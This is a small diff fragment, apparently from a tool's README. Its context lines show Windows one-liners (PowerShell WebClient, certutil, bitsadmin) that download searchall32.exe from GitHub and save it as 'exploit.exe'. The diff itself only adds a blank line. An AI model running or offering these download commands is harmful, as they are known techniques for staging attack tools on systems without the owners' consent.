@@ -282,3 +282,4 @@ powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('https://github
 certutil.exe -urlcache -split -f https://github.com/Naturehi666/searchall/releases/download/search3.5.10/searchall32.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/Naturehi666/searchall/releases/download/search3.5.10/searchall32.exe" c:\\exploit.exe
 ```
+
